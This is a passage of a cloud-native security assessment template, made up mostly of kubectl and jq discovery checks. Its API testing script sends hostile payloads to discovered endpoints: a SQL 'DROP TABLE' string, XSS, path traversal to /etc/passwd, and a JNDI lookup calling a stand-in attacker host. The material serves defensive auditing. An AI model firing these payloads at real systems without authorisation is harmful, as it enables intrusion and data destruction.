# Cloud-Native Security Assessment

## Assessment Overview

This template provides a comprehensive framework for conducting security assessments of cloud-native applications and architectures, focusing on microservices, service meshes, API gateways, event-driven architectures, and modern DevSecOps practices aligned with CNCF security best practices and Zero Trust principles.

### Assessment Scope
- **Target Environment**: Cloud-native applications, microservices, service meshes
- **Architecture Patterns**: Microservices, event-driven, API-first, containerized applications
- **Framework Alignment**: CNCF Security TAG, OWASP Cloud-Native Application Security Top 10
- **Assessment Duration**: 3-6 weeks depending on application complexity
- **Required Access**: Application developer, platform admin, security team collaboration

### Key Assessment Areas
1. Microservices Security Architecture
2. API Security and Gateway Configuration
3. Service Mesh Security (Istio, Linkerd, Consul Connect)
4. Event-Driven Architecture Security
5. Container and Orchestration Security
6. DevSecOps Pipeline Security
7. Observability and Security Monitoring
8. Data Protection and Privacy

## Pre-Assessment Planning

### Cloud-Native Architecture Discovery

#### Application Architecture Mapping
```bash
# Kubernetes-based application discovery
echo "=== Cloud-Native Application Discovery ==="

# Get all deployments and their relationships
kubectl get deployments -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,IMAGE:.spec.template.spec.containers[0].image,REPLICAS:.status.replicas"

# Service topology mapping
kubectl get services -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER_IP:.spec.clusterIP,EXTERNAL_IP:.status.loadBalancer.ingress[0].ip"

# Ingress and API gateway discovery
kubectl get ingresses -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,HOSTS:.spec.rules[*].host,ADDRESS:.status.loadBalancer.ingress[0].ip"

# ConfigMaps and Secrets (application configuration)
kubectl get configmaps,secrets -A --field-selector type!=kubernetes.io/service-account-token -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type"

# Persistent volumes and storage
kubectl get pvc -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,STATUS:.status.phase,VOLUME:.spec.volumeName,SIZE:.spec.resources.requests.storage,STORAGECLASS:.spec.storageClassName"
```

#### Service Mesh Discovery
```bash
# Istio service mesh assessment
echo "=== Service Mesh Security Assessment ==="

# Check if Istio is installed
kubectl get namespace istio-system 2>/dev/null && echo "✅ Istio detected" || echo "❌ Istio not found"

if kubectl get namespace istio-system >/dev/null 2>&1; then
    echo "Istio Components:"
    kubectl get pods -n istio-system
    
    echo "Istio Configuration:"
    kubectl get gateway -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,HOSTS:.spec.servers[*].hosts"
    kubectl get virtualservice -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,HOSTS:.spec.hosts,GATEWAYS:.spec.gateways"
    kubectl get destinationrule -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,HOST:.spec.host,TRAFFICPOLICY:.spec.trafficPolicy"
    
    echo "Security Policies:"
    kubectl get peerauthentication -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,MTLS:.spec.mtls.mode"
    kubectl get authorizationpolicy -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,SELECTOR:.spec.selector"
fi

# Linkerd service mesh assessment
kubectl get namespace linkerd >/dev/null 2>&1 && echo "✅ Linkerd detected" || echo "❌ Linkerd not found"

if kubectl get namespace linkerd >/dev/null 2>&1; then
    echo "Linkerd Components:"
    kubectl get pods -n linkerd
    
    echo "Linkerd Traffic Policies:"
    kubectl get trafficsplit -A 2>/dev/null || echo "No TrafficSplit resources found"
    kubectl get serviceprofile -A 2>/dev/null || echo "No ServiceProfile resources found"
fi

# Consul Connect assessment
kubectl get pods -A | grep consul && echo "✅ Consul detected" || echo "❌ Consul not found"
```

#### API Gateway and Ingress Security
```bash
# API Gateway security assessment
echo "=== API Gateway Security Assessment ==="

# NGINX Ingress Controller
kubectl get pods -A | grep nginx-ingress && echo "✅ NGINX Ingress detected"
if kubectl get pods -A | grep nginx-ingress >/dev/null; then
    kubectl get configmap -A | grep nginx
    echo "NGINX Ingress Configuration:"
    kubectl describe configmap -n ingress-nginx ingress-nginx-controller 2>/dev/null | grep -E "(ssl-redirect|force-ssl-redirect|ssl-protocols|ssl-ciphers)" || echo "SSL configuration not found"
fi

# Traefik Ingress
kubectl get pods -A | grep traefik && echo "✅ Traefik detected"

# Ambassador/Emissary Ingress
kubectl get pods -A | grep ambassador && echo "✅ Ambassador detected"
kubectl get pods -A | grep emissary && echo "✅ Emissary detected"

# Kong Gateway
kubectl get pods -A | grep kong && echo "✅ Kong detected"

# Contour
kubectl get pods -A | grep contour && echo "✅ Contour detected"

# Check for rate limiting and security policies
echo "Ingress Security Policies:"
kubectl get middleware -A 2>/dev/null | head -10 || echo "No Traefik middleware found"
kubectl get rateLimitService -A 2>/dev/null | head -10 || echo "No rate limiting services found"
```

### Application Dependencies and Supply Chain
```bash
# Container image analysis and supply chain security
echo "=== Supply Chain Security Assessment ==="

# Get all unique container images in the cluster
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u > /tmp/cluster_images.txt

echo "Unique container images in cluster: $(cat /tmp/cluster_images.txt | wc -l)"
echo "Top 10 most used images:"
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq -c | sort -nr | head -10

# Check for image vulnerability scanning if Trivy operator is installed
kubectl get vulnerabilityreports -A 2>/dev/null | head -10 || echo "No Trivy vulnerability reports found"

# Check for image signing verification (if Cosign/Gatekeeper is configured)
kubectl get constrainttemplate 2>/dev/null | grep -i "cosign\|signature" || echo "No image signing constraints found"

# SBOM (Software Bill of Materials) assessment
echo "Checking for SBOM generation capability..."
command -v syft >/dev/null && echo "✅ Syft available for SBOM generation" || echo "❌ Syft not available"
command -v cosign >/dev/null && echo "✅ Cosign available for signature verification" || echo "❌ Cosign not available"

# Check for policy enforcement
kubectl get admissionregistration.k8s.io/v1/validatingadmissionwebhooks 2>/dev/null | grep -E "(gatekeeper|kyverno|falco)" || echo "No policy enforcement webhooks detected"
```

## OWASP Cloud-Native Application Security Top 10 Assessment

### CNAS-1: Insecure Cloud, Container, and Orchestration Configuration

#### Configuration Security Assessment
```bash
# Kubernetes security configuration assessment
echo "=== K8s Security Configuration Assessment ==="

# Pod Security Standards assessment
kubectl get namespaces -o json | jq -r '.items[] | {
  name: .metadata.name,
  enforce: .metadata.labels["pod-security.kubernetes.io/enforce"],
  audit: .metadata.labels["pod-security.kubernetes.io/audit"],
  warn: .metadata.labels["pod-security.kubernetes.io/warn"]
} | "\(.name): enforce=\(.enforce), audit=\(.audit), warn=\(.warn)"'

# Security contexts analysis
echo "Pods running as root or privileged:"
kubectl get pods -A -o json | jq -r '.items[] | 
select(.spec.securityContext.runAsUser == 0 or .spec.containers[].securityContext.runAsUser == 0 or .spec.containers[].securityContext.privileged == true) |
"\(.metadata.namespace)/\(.metadata.name): Root or privileged detected"'

# Resource limits and requests
echo "Pods without resource limits:"
kubectl get pods -A -o json | jq -r '.items[] |
select(.spec.containers[].resources.limits == null) |
"\(.metadata.namespace)/\(.metadata.name): No resource limits"' | head -10

# Network policies enforcement
echo "Network policies coverage:"
kubectl get namespaces -o json | jq -r '.items[].metadata.name' | while read ns; do
    pod_count=$(kubectl get pods -n $ns --no-headers 2>/dev/null | wc -l)
    netpol_count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l)
    if [ $pod_count -gt 0 ] && [ $netpol_count -eq 0 ]; then
        echo "⚠️  Namespace $ns: $pod_count pods, $netpol_count network policies"
    fi
done
```

**Key Assessment Points**:
- [ ] Pod Security Standards implemented across namespaces
- [ ] No containers running as root or with privileged access
- [ ] Resource limits and requests configured for all workloads
- [ ] Network policies implemented for traffic segmentation
- [ ] ReadOnlyRootFilesystem enabled where possible

### CNAS-2: Injection Flaws (App Layer, Cloud Events, etc.)

#### API and Event Injection Assessment
```bash
# API endpoint discovery and security assessment
echo "=== API Security Assessment ==="

# Get all HTTP services and ingresses
kubectl get ingresses -A -o json | jq -r '.items[] | 
"\(.metadata.namespace)/\(.metadata.name): " +
(.spec.rules[] | "\(.host)" + (.http.paths[] | " \(.path) -> \(.backend.service.name):\(.backend.service.port.number)"))' | head -20

# Service discovery for internal APIs
kubectl get services -A --field-selector spec.type=ClusterIP -o json | jq -r '.items[] |
select(.spec.ports[] | .port == 80 or .port == 443 or .port == 8080 or .port == 3000 or .port == 8000) |
"\(.metadata.namespace)/\(.metadata.name): \(.spec.ports[].port)"' | head -20

# Check for GraphQL endpoints (common in cloud-native apps)
echo "Checking for GraphQL endpoints..."
kubectl get ingresses -A -o json | jq -r '.items[].spec.rules[].http.paths[] | select(.path | contains("graphql")) | .path' || echo "No GraphQL paths found in ingresses"

# Event-driven architecture security
echo "Event sources and message queues:"
kubectl get pods -A -o json | jq -r '.items[] |
select(.spec.containers[].image | contains("kafka") or contains("rabbitmq") or contains("redis") or contains("nats")) |
"\(.metadata.namespace)/\(.metadata.name): \(.spec.containers[0].image)"' | head -10
```

#### Input Validation and Sanitization
```python
# Python script for API security testing integration
import requests
import json
import subprocess

def assess_api_security():
    """Assess API security for cloud-native applications"""
    
    # Get ingress endpoints from Kubernetes
    try:
        ingress_result = subprocess.run([
            'kubectl', 'get', 'ingresses', '-A', '-o', 'json'
        ], capture_output=True, text=True)
        
        if ingress_result.returncode == 0:
            ingresses = json.loads(ingress_result.stdout)
            
            api_endpoints = []
            for ingress in ingresses.get('items', []):
                for rule in ingress.get('spec', {}).get('rules', []):
                    host = rule.get('host', 'localhost')
                    for path_info in rule.get('http', {}).get('paths', []):
                        path = path_info.get('path', '/')
                        api_endpoints.append(f"https://{host}{path}")
            
            print(f"Discovered {len(api_endpoints)} API endpoints")
            
            # Basic security checks (would be expanded with proper API testing tools)
            security_findings = []
            
            for endpoint in api_endpoints[:5]:  # Test first 5 endpoints
                print(f"Testing endpoint: {endpoint}")
                
                # Test for common injection patterns
                injection_payloads = [
                    "'; DROP TABLE users; --",
                    "<script>alert('xss')</script>",
                    "../../etc/passwd",
                    "${jndi:ldap://evil.com/a}"
                ]
                
                for payload in injection_payloads:
                    try:
                        # Test POST request with injection payload
                        response = requests.post(
                            endpoint,
                            json={'test': payload},
                            timeout=5,
                            verify=False  # For testing purposes
                        )
                        
                        if payload in response.text:
                            security_findings.append({
                                'endpoint': endpoint,
                                'vulnerability': 'Potential injection vulnerability',
                                'payload': payload,
                                'severity': 'High'
                            })
                    except requests.RequestException:
                        # Expected for many endpoints
                        pass
            
            return security_findings
        
    except Exception as e:
        print(f"API security assessment error: {e}")
        return []

# Example usage
if __name__ == "__main__":
    findings = assess_api_security()
    for finding in findings:
        print(f"[{finding['severity']}] {finding['endpoint']}: {finding['vulnerability']}")
```

**Key Assessment Points**:
- [ ] Input validation implemented at API gateway and application levels
- [ ] SQL injection prevention in database interactions
- [ ] XSS protection in web interfaces
- [ ] LDAP injection prevention in directory services
- [ ] Event payload validation in message processing

### CNAS-3: Improper Identity, Credential, and Access Management

#### Cloud-Native Identity and Access Assessment
```bash
# Service account and RBAC assessment
echo "=== Identity and Access Management Assessment ==="

# Service account analysis
kubectl get serviceaccounts -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,SECRETS:.secrets[*].name"

# Check for default service account usage
kubectl get pods -A -o json | jq -r '.items[] |
select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) |
"\(.metadata.namespace)/\(.metadata.name): Using default service account"' | head -10

# RBAC analysis - overprivileged roles
kubectl get clusterroles -o json | jq -r '.items[] |
select(.rules[]? | select(.verbs[]? == "*" or (.resources[]? == "*"))) |
.metadata.name' | head -10

# Check for cluster-admin usage
kubectl get clusterrolebindings -o json | jq -r '.items[] |
select(.roleRef.name == "cluster-admin") |
"\(.metadata.name): \(.subjects[]?.name) (\(.subjects[]?.kind))"'

# Service mesh identity assessment (mTLS)
if kubectl get namespace istio-system >/dev/null 2>&1; then
    echo "Istio mTLS Configuration:"
    kubectl get peerauthentication -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,MTLS:.spec.mtls.mode"
    
    echo "Services without mTLS:"
    kubectl get services -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"' | while read svc; do
        ns=$(echo $svc | cut -d'/' -f1)
        name=$(echo $svc | cut -d'/' -f2)
        mtls_policy=$(kubectl get peerauthentication -n $ns -o json 2>/dev/null | jq -r ".items[] | select(.spec.selector.matchLabels.app == \"$name\") | .spec.mtls.mode" 2>/dev/null)
        if [ -z "$mtls_policy" ]; then
            echo "⚠️  $svc: No explicit mTLS policy"
        fi
    done | head -5
fi

# External secret management integration
kubectl get secretproviderclass -A 2>/dev/null | head -5 || echo "No external secret providers found"
kubectl get externalsecret -A 2>/dev/null | head -5 || echo "No external secrets found"
```

#### Authentication and Authorization Mechanisms
```bash
# OAuth/OIDC integration assessment
echo "=== Authentication Mechanisms ==="

# Check for OAuth2-proxy or similar authentication proxies
kubectl get deployments -A | grep -E "(oauth2-proxy|auth|keycloak|dex)" || echo "No authentication proxies detected"

# API Gateway authentication configuration
if kubectl get ingresses -A | grep -q nginx; then
    echo "NGINX Ingress authentication annotations:"
    kubectl get ingresses -A -o json | jq -r '.items[] |
    select(.metadata.annotations | has("nginx.ingress.kubernetes.io/auth-url")) |
    "\(.metadata.namespace)/\(.metadata.name): Auth URL configured"'
fi

# JWT token validation setup
kubectl get services -A | grep -E "(jwt|token|auth)" || echo "No JWT validation services detected"

# Check for service mesh authorization policies
if kubectl get namespace istio-system >/dev/null 2>&1; then
    echo "Istio Authorization Policies:"
    kubectl get authorizationpolicy -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,SELECTOR:.spec.selector.matchLabels"
fi
```

**Key Assessment Points**:
- [ ] Strong authentication mechanisms implemented (OAuth2/OIDC)
- [ ] Service-to-service authentication (mTLS, JWT)
- [ ] Principle of least privilege in RBAC configurations
- [ ] External identity provider integration
- [ ] Secrets management with external providers (Vault, Cloud KMS)

### CNAS-4: Insufficient Logging & Monitoring to Detect Attacks

#### Observability and Security Monitoring
```bash
# Logging and monitoring stack assessment
echo "=== Observability Stack Assessment ==="

# Check for logging infrastructure
kubectl get pods -A | grep -E "(fluentd|fluentbit|filebeat|logstash)" && echo "✅ Log shipping agents detected" || echo "❌ No log shipping detected"
kubectl get pods -A | grep -E "(elasticsearch|loki|splunk)" && echo "✅ Log storage detected" || echo "❌ No log storage detected"
kubectl get pods -A | grep -E "(kibana|grafana)" && echo "✅ Log visualization detected" || echo "❌ No log visualization detected"

# Metrics and monitoring
kubectl get pods -A | grep -E "(prometheus|victoriametrics)" && echo "✅ Metrics collection detected" || echo "❌ No metrics collection detected"
kubectl get pods -A | grep -E "(grafana|grafana-enterprise)" && echo "✅ Metrics visualization detected" || echo "❌ No metrics visualization detected"
kubectl get pods -A | grep -E "(alertmanager|notification)" && echo "✅ Alerting detected" || echo "❌ No alerting detected"

# Distributed tracing
kubectl get pods -A | grep -E "(jaeger|zipkin|tempo)" && echo "✅ Distributed tracing detected" || echo "❌ No distributed tracing detected"

# Security monitoring tools
kubectl get pods -A | grep -E "(falco|twistlock|aqua|sysdig)" && echo "✅ Security monitoring detected" || echo "❌ No security monitoring detected"

# Service mesh observability
if kubectl get namespace istio-system >/dev/null 2>&1; then
    echo "Istio Observability Configuration:"
    kubectl get telemetry -A 2>/dev/null || echo "No Istio telemetry configuration found"
    kubectl get wasmplugin -A 2>/dev/null || echo "No Istio WASM plugins found"
fi

# Log analysis for security events
echo "Sample log sources analysis:"
kubectl get pods -A -o json | jq -r '.items[] |
select(.spec.containers[].image | contains("nginx") or contains("httpd") or contains("traefik")) |
"\(.metadata.namespace)/\(.metadata.name): Web server - check access logs"' | head -5

# Application Performance Monitoring (APM)
kubectl get pods -A | grep -E "(datadog|newrelic|appdynamics|dynatrace)" && echo "✅ APM solution detected" || echo "❌ No APM solution detected"
```

#### Security Event Detection and Response
```bash
# Security event detection capabilities
echo "=== Security Event Detection ==="

# Runtime security monitoring
kubectl get daemonsets -A | grep -E "(falco|sysdig|aqua|twistlock)" || echo "No runtime security monitoring found"

# Network security monitoring
kubectl get pods -A | grep -E "(cilium|calico)" && echo "✅ Network security monitoring capable CNI detected"

# Anomaly detection
kubectl get pods -A | grep -E "(anomaly|ml|ai)" && echo "Anomaly detection capabilities found"

# SIEM integration
echo "Checking for SIEM integration capabilities..."
kubectl get configmaps -A | grep -E "(siem|splunk|elastic|sentinel)" || echo "No SIEM integration configuration found"

# Incident response automation
kubectl get pods -A | grep -E "(playbook|runbook|automation|workflow)" || echo "No incident response automation detected"
```

**Key Assessment Points**:
- [ ] Comprehensive logging across all application tiers
- [ ] Security-focused log collection and analysis
- [ ] Real-time security monitoring and alerting
- [ ] Distributed tracing for request flow visibility
- [ ] Automated incident response capabilities

### CNAS-5: Insecure Secrets Storage

#### Secrets Management Assessment
```bash
# Kubernetes secrets analysis
echo "=== Secrets Management Assessment ==="

# Basic secrets inventory
kubectl get secrets -A --field-selector type!=kubernetes.io/service-account-token -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type,DATA:.data"

# Check for base64-encoded secrets (not encrypted at rest properly)
echo "Secrets that may contain sensitive data:"
kubectl get secrets -A --field-selector type!=kubernetes.io/service-account-token -o json | jq -r '.items[] |
select(.data | keys[] | test("password|key|token|secret"; "i")) |
"\(.metadata.namespace)/\(.metadata.name): Contains \(.data | keys | join(", "))"' | head -10

# External secret management integration
echo "External Secret Management Integration:"
kubectl get crd 2>/dev/null | grep -E "(secret|vault|external)" || echo "No external secret management CRDs found"

# Specific external secret operators
kubectl get pods -A | grep -E "(external-secrets|secret-store-csi|vault|sealed-secrets)" && echo "✅ External secret management detected" || echo "❌ No external secret management detected"

# Azure Key Vault integration (if on Azure)
kubectl get secretproviderclass -A 2>/dev/null | head -5 || echo "No Azure Key Vault Secret Store CSI driver found"

# AWS Secrets Manager integration (if on AWS)
kubectl get externalsecret -A 2>/dev/null | head -5 || echo "No AWS External Secrets Operator found"

# HashiCorp Vault integration
kubectl get vaultauth -A 2>/dev/null | head -5 || echo "No Vault authentication configuration found"
kubectl get vaultsecret -A 2>/dev/null | head -5 || echo "No Vault secrets found"

# Sealed Secrets (Bitnami)
kubectl get sealedsecret -A 2>/dev/null | head -5 || echo "No Sealed Secrets found"

# Check for secrets mounted as environment variables (less secure)
echo "Secrets exposed as environment variables:"
kubectl get pods -A -o json | jq -r '.items[] |
select(.spec.containers[].env[]?.valueFrom.secretKeyRef != null) |
"\(.metadata.namespace)/\(.metadata.name): Secret exposed as env var"' | head -5
```

#### Secret Rotation and Lifecycle Management
```bash
# Secret rotation assessment
echo "=== Secret Rotation Assessment ==="

# Check secret age (Kubernetes doesn't provide creation time easily)
echo "Secret lifecycle management requires external tooling or manual tracking"

# Look for secret rotation automation
kubectl get cronjobs -A | grep -E "(rotate|refresh|update)" || echo "No secret rotation jobs found"

# Check for cert-manager (certificate lifecycle)
kubectl get pods -A | grep cert-manager && echo "✅ Cert-manager for certificate lifecycle detected" || echo "❌ No certificate lifecycle management detected"

if kubectl get crd certificates.cert-manager.io 2>/dev/null; then
    echo "Certificate resources:"
    kubectl get certificates -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,READY:.status.conditions[?(@.type=='Ready')].status,SECRET:.spec.secretName" | head -10
fi
```

**Key Assessment Points**:
- [ ] No hardcoded secrets in container images or configuration
- [ ] External secret management integration (Vault, Cloud KMS)
- [ ] Secret encryption at rest with customer-managed keys
- [ ] Regular secret rotation policies implemented
- [ ] Secrets mounted as files, not environment variables

## Advanced Cloud-Native Security Assessment

### Service Mesh Security Deep Dive
```bash
# Comprehensive service mesh security assessment
echo "=== Service Mesh Security Deep Dive ==="

if kubectl get namespace istio-system >/dev/null 2>&1; then
    echo "=== Istio Security Configuration ==="
    
    # Global security policies
    kubectl get peerauthentication -A -o yaml | grep -A5 -B5 "mtls:"
    
    # Authorization policies coverage
    kubectl get services -A --field-selector spec.type=ClusterIP | while read ns name rest; do
        if [ "$ns" != "NAMESPACE" ]; then
            authz_policies=$(kubectl get authorizationpolicy -n $ns -o json | jq -r ".items[] | select(.spec.selector.matchLabels.app == \"$name\" or .spec.selector == {}) | .metadata.name" 2>/dev/null)
            if [ -z "$authz_policies" ]; then
                echo "⚠️  Service $ns/$name: No authorization policy"
            fi
        fi
    done | head -10
    
    # Istio Gateway security
    kubectl get gateway -A -o json | jq -r '.items[] |
    "\(.metadata.namespace)/\(.metadata.name): " +
    (.spec.servers[] | "Port \(.port.number) Protocol \(.port.protocol) TLS:\(.tls.mode // "None")")'
    
    # Virtual Service security headers
    kubectl get virtualservice -A -o json | jq -r '.items[] |
    select(.spec.http[].headers.response.add != null) |
    "\(.metadata.namespace)/\(.metadata.name): Security headers configured"'
    
    # Destination Rule TLS settings
    kubectl get destinationrule -A -o json | jq -r '.items[] |
    select(.spec.trafficPolicy.tls != null) |
    "\(.metadata.namespace)/\(.metadata.name): TLS configuration: \(.spec.trafficPolicy.tls.mode)"'
fi

# Linkerd security assessment
if kubectl get namespace linkerd >/dev/null 2>&1; then
    echo "=== Linkerd Security Configuration ==="
    
    # Check automatic mTLS
    linkerd stat --help >/dev/null 2>&1 && linkerd stat deployments -A | grep -E "(SUCCESS|[0-9]+%)" || echo "Linkerd CLI not available"
    
    # Service profiles for security policies
    kubectl get serviceprofile -A -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,ROUTES:.spec.routes[*].name" 2>/dev/null || echo "No service profiles found"
fi
```

### API Gateway Security Configuration
```bash
# Advanced API gateway security assessment
echo "=== API Gateway Security Configuration ==="

# Rate limiting configuration
if kubectl get middleware -A >/dev/null 2>&1; then
    echo "Traefik Rate Limiting:"
    kubectl get middleware -A -o json | jq -r '.items[] |
    select(.spec.rateLimit != null) |
    "\(.metadata.namespace)/\(.metadata.name): Rate limit configured"'
fi

# Security headers middleware
kubectl get middleware -A -o json 2>/dev/null | jq -r '.items[] |
select(.spec.headers.customRequestHeaders != null or .spec.headers.customResponseHeaders != null) |
"\(.metadata.namespace)/\(.metadata.name): Custom headers configured"' || echo "No Traefik middleware found"

# NGINX rate limiting and security
if kubectl get configmap -A | grep nginx-controller >/dev/null; then
    echo "NGINX Controller Security Configuration:"
    kubectl get configmap -n ingress-nginx ingress-nginx-controller -o yaml | grep -E "(rate-limit|ssl-redirect|force-ssl-redirect)" || echo "No security-related NGINX config found"
fi

# Kong Gateway security plugins
kubectl get kongplugins -A 2>/dev/null | head -10 || echo "No Kong plugins found"

# Ambassador/Emissary security configuration
kubectl get authservice -A 2>/dev/null | head -5 || echo "No Ambassador auth services found"
kubectl get ratelimitservice -A 2>/dev/null | head -5 || echo "No Ambassador rate limit services found"
```

### Event-Driven Architecture Security
```bash
# Event-driven architecture security assessment
echo "=== Event-Driven Architecture Security ==="

# Message broker security
kubectl get pods -A | grep -E "(kafka|rabbitmq|nats|pulsar)" | while read ns pod rest; do
    echo "Message broker found: $ns/$pod"
done

# Kafka security (if present)
if kubectl get pods -A | grep kafka >/dev/null; then
    echo "Kafka Security Assessment:"
    kubectl get configmaps -A | grep kafka | while read ns configmap rest; do
        echo "Kafka ConfigMap: $ns/$configmap"
        kubectl get configmap $configmap -n $ns -o yaml | grep -E "(ssl|tls|sasl|security)" || echo "No security config found"
    done
fi

# Event source validation
echo "Event Sources and Triggers:"
kubectl get pods -A -o json | jq -r '.items[] |
select(.metadata.labels.app | test("event|trigger|webhook")) |
"\(.metadata.namespace)/\(.metadata.name): Event processor"' | head -5

# CloudEvents validation (if using CloudEvents)
kubectl get pods -A -o json | jq -r '.items[] |
select(.spec.containers[].env[]?.name == "CE_SOURCE" or .spec.containers[].env[]?.name == "CE_TYPE") |
"\(.metadata.namespace)/\(.metadata.name): CloudEvents integration"' | head -5

# Message queue access control
echo "Message queue access control assessment requires broker-specific analysis"
```

## DevSecOps Pipeline Security Assessment

### CI/CD Security Integration
```bash
# CI/CD security assessment for cloud-native applications
echo "=== DevSecOps Pipeline Security Assessment ==="

# Look for CI/CD related resources in cluster
kubectl get pods -A | grep -E "(jenkins|tekton|argo|gitlab|github)" && echo "CI/CD components in cluster" || echo "No CI/CD components detected in cluster"

# Tekton Pipelines security
if kubectl get crd tasks.tekton.dev 2>/dev/null; then
    echo "Tekton Security Assessment:"
    kubectl get tasks -A | head -10
    kubectl get clustertasks | grep -E "(security|scan|test)" || echo "No security-focused ClusterTasks found"
    
    # Check for security scanning tasks
    kubectl get pipelines -A -o json | jq -r '.items[].spec.tasks[] |
    select(.name | test("security|scan|test")) |
    .name' | head -5 || echo "No security tasks in pipelines"
fi

# Argo Workflows security
if kubectl get workflows -A 2>/dev/null >/dev/null; then
    echo "Argo Workflows detected - check for security scanning steps"
    kubectl get workflows -A | head -5
fi

# Container image scanning integration
echo "Container Security Scanning Integration:"

# Check for Trivy operator
kubectl get crd vulnerabilityreports.aquasecurity.github.io 2>/dev/null && echo "✅ Trivy Operator detected" || echo "❌ Trivy Operator not found"

if kubectl get crd vulnerabilityreports.aquasecurity.github.io 2>/dev/null; then
    echo "Recent vulnerability reports:"
    kubectl get vulnerabilityreports -A | head -10
    
    echo "Critical vulnerabilities:"
    kubectl get vulnerabilityreports -A -o json | jq -r '.items[] |
    select(.report.summary.criticalCount > 0) |
    "\(.metadata.namespace)/\(.metadata.name): \(.report.summary.criticalCount) critical vulnerabilities"' | head -5
fi

# Policy as Code enforcement
kubectl get crd constraints.templates.gatekeeper.sh 2>/dev/null && echo "✅ Gatekeeper OPA detected" || echo "❌ Gatekeeper not found"
kubectl get crd policies.kyverno.io 2>/dev/null && echo "✅ Kyverno detected" || echo "❌ Kyverno not found"

if kubectl get crd constraints.templates.gatekeeper.sh 2>/dev/null; then
    echo "Gatekeeper Constraints:"
    kubectl get constraints -A | head -10
fi

if kubectl get crd policies.kyverno.io 2>/dev/null; then
    echo "Kyverno Policies:"
    kubectl get policies -A | head -10
fi
```

### Supply Chain Security Assessment
```bash
# Supply chain security for cloud-native applications
echo "=== Supply Chain Security Assessment ==="

# Image signing and verification
echo "Image Signing and Verification:"

# Check for Cosign verification policies
kubectl get crd cosignpolicies.security.grafana.com 2>/dev/null && echo "✅ Cosign policies detected" || echo "❌ No Cosign policies found"

# Sigstore integration
kubectl get pods -A | grep -E "(cosign|rekor|fulcio)" && echo "✅ Sigstore components detected" || echo "❌ No Sigstore components found"

# Notary v2 integration
kubectl get pods -A | grep notary && echo "✅ Notary detected" || echo "❌ No Notary found"

# SBOM generation and tracking
echo "Software Bill of Materials (SBOM):"
kubectl get crd sbomreports.aquasecurity.github.io 2>/dev/null && echo "✅ SBOM reports available" || echo "❌ No SBOM tracking found"

# Check for SLSA provenance
echo "Supply chain provenance tracking requires repository and CI/CD integration analysis"

# Admission controllers for supply chain security
kubectl get validatingadmissionwebhooks | grep -E "(cosign|image|policy)" || echo "No image verification admission controllers found"
```

## Automated Cloud-Native Security Assessment

### Comprehensive Assessment Script
```bash
#!/bin/bash
# Comprehensive Cloud-Native Security Assessment Script

set -e

ASSESSMENT_DATE=$(date +%Y-%m-%d-%H%M)
REPORT_DIR="./cloud-native-security-assessment-$ASSESSMENT_DATE"
mkdir -p "$REPORT_DIR"

echo "=== Cloud-Native Security Assessment ==="
echo "Assessment Date: $(date)"
echo "Report Directory: $REPORT_DIR"
echo

# Function to run assessment and save output
run_assessment() {
    local test_name=$1
    local command=$2
    local output_file="$REPORT_DIR/${test_name}.txt"
    
    echo "Running: $test_name"
    echo "=== $test_name ===" > "$output_file"
    echo "Generated: $(date)" >> "$output_file"
    echo >> "$output_file"
    
    if eval "$command" >> "$output_file" 2>&1; then
        echo "✅ $test_name completed"
    else
        echo "⚠️  $test_name failed or had issues"
    fi
}

# Cluster and workload discovery
run_assessment "cluster-info" "kubectl cluster-info && kubectl get nodes -o wide"
run_assessment "workload-inventory" "kubectl get deployments,statefulsets,daemonsets -A -o wide"
run_assessment "service-discovery" "kubectl get services,ingresses -A -o wide"

# Security configuration assessment
run_assessment "pod-security-standards" "kubectl get namespaces -o json | jq -r '.items[] | {name: .metadata.name, enforce: .metadata.labels[\"pod-security.kubernetes.io/enforce\"], audit: .metadata.labels[\"pod-security.kubernetes.io/audit\"]}'"

run_assessment "security-contexts" "kubectl get pods -A -o json | jq -r '.items[] | select(.spec.securityContext.runAsUser == 0 or .spec.containers[].securityContext.runAsUser == 0 or .spec.containers[].securityContext.privileged == true) | \"\(.metadata.namespace)/\(.metadata.name): Security concern detected\"'"

run_assessment "network-policies" "kubectl get networkpolicies -A -o wide && echo && kubectl get namespaces -o json | jq -r '.items[].metadata.name' | while read ns; do pod_count=\$(kubectl get pods -n \$ns --no-headers 2>/dev/null | wc -l); netpol_count=\$(kubectl get networkpolicies -n \$ns --no-headers 2>/dev/null | wc -l); if [ \$pod_count -gt 0 ] && [ \$netpol_count -eq 0 ]; then echo \"⚠️  Namespace \$ns: \$pod_count pods, \$netpol_count network policies\"; fi; done"

# RBAC and access control assessment
run_assessment "rbac-analysis" "kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | select(.verbs[]? == \"*\" or (.resources[]? == \"*\"))) | .metadata.name' | head -10 && echo && kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == \"cluster-admin\") | \"\(.metadata.name): \(.subjects[]?.name) (\(.subjects[]?.kind))\"'"

